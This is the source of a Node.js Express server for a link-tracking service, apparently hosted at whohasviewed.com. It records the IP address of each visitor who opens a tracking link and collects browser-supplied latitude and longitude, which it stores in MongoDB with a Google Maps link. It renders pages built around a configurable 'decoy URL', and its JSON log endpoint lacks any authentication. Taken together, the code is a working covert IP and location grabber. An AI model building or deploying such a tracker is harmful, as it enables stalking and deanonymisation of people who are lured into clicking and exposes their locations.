const express = require('express');
const mongoose = require('mongoose');
const { v4: uuidv4 } = require('uuid');
const bodyParser = require('body-parser');
const Reader = require('@maxmind/geoip2-node').Reader;
const fs = require('fs');
require('dotenv').config();

const app = express();
const PORT = 3000;
mongoose.connect(process.env.MONGO_DB_URL)
    .then(() => console.log('Connected to MongoDB'))
    .catch(err => console.log('Error connecting to MongoDB:', err));

app.use(bodyParser.json());
app.use(express.static('public')); // For static files
app.set('view engine', 'ejs');

const siteURL = process.env.SITE_URL;
const decoyURL = process.env.DECOY_URL;

// Define Mongoose schema for the logs
const logSchema = new mongoose.Schema({
    linkId: { type: String, required: true },
    ip: String,
    status: String,
    latitude: Number,
    longitude: Number,
    locationUrl: String,
    timestamp: { type: Date, default: Date.now }
});

const Log = mongoose.model('Log', logSchema);

let linkLogs = {}; // Temporary in-memory store for shareable links

// Home Page
app.get('/', (req, res) => {
    const host = req.headers.host;
    let ipAddress;
    let isUS;
    if (req.ip === '::1') {
        ipAddress = '2601:483:4b80:e460:2484:d320:43b0:f810';
    }
    else {
        ipAddress = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.ip || 'n/a';
    }
    Reader.open('GeoIP2-Country.mmdb').then(reader => {
        const response = reader.country(ipAddress);

        response.country.isoCode === 'US' ? isUS = true : isUS = false;

        if (host === 'whohasviewed.com' || host === 'www.whohasviewed.com') {
            res.redirect('/t/null');
        } else {

            res.render('index', { siteURL, decoyURL, isUS });
        }
    });
});

// Tracking page (logs the click event)
app.get('/t/:id', (req, res) => {
    const { id } = req.params;
    const userIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    if (linkLogs[id]) {
        linkLogs[id].push({ ip: userIp, status: 'Clicked', location: null, timestamp: new Date() });
    }

    res.render('track', { trackId: id });
});

// Receive location data and store it in MongoDB
// In your POST /location/:id route
app.post('/location/:id', (req, res) => {
    const { latitude, longitude, status } = req.body;
    let ip = req.headers['x-forwarded-for'] || req.ip || 'n/a';

    const newLog = new Log({
        linkId: req.params.id,
        ip: ip,
        status: status || 'Location Not Shared',
        latitude: latitude || null,
        longitude: longitude || null,
        locationUrl: latitude && longitude ? `https://www.google.com/maps?q=${latitude},${longitude}` : null,
    });

    newLog.save()
        .then(() => {
            res.status(200).json({ message: 'Log updated' });
        })
        .catch(err => {
            res.status(500).json({ message: 'Error saving log', error: err });
        });
});

// View logs for a specific link as JSON
app.get('/jsonlogs/:id', (req, res) => {
    const { id } = req.params;

    // Fetch logs from MongoDB for this linkId
    Log.find({ linkId: id })
        .then((logs) => {
            res.json(logs);  // Send logs in JSON format
        })
        .catch((err) => {
            console.error('Error fetching logs from MongoDB:', err);
            res.status(500).json({ message: 'Failed to retrieve logs' });
        });
});


app.get('/logs/:id', (req, res) => {
    const host = req.headers.host;
    const { id } = req.params;
    let ipAddress;
    let isUS;
    if (req.ip === '::1') {
        ipAddress = '2601:483:4b80:e460:2484:d320:43b0:f810';
    }
    else {
        ipAddress = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.ip || 'n/a';
    }
    Reader.open('GeoIP2-Country.mmdb').then(reader => {
        const response = reader.country(ipAddress); 
        response.country.isoCode === 'US' ? isUS = true : isUS = false;
        res.render('logs', { decoyURL, siteURL, id, isUS });
    });
});

app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
});
